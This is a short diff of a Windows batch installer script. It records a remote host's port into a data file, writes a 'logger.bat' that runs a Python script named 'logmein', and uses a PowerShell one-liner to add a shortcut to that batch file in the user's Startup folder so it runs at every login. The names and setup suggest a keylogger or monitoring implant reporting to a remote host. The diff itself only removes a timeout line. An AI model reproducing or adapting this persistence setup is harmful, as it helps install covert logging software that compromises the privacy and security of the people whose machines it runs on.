@@ -15,7 +15,6 @@ echo %input% >> C:\logmein\logmein.data
 set /P input=Port number of the host (Example \"1000\") (mostly 80/443) :  
 echo %input% >> C:\logmein\logmein.data
 echo @echo off > C:\logmein\logger.bat
-echo timeout 5 >> C:\logmein\logger.bat
 echo C:\Python27\python.exe C:\logmein\logmein >> C:\logmein\logger.bat
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\logger.lnk');$s.TargetPath='C:\logmein\logger.bat';$s.Save()"
 pause
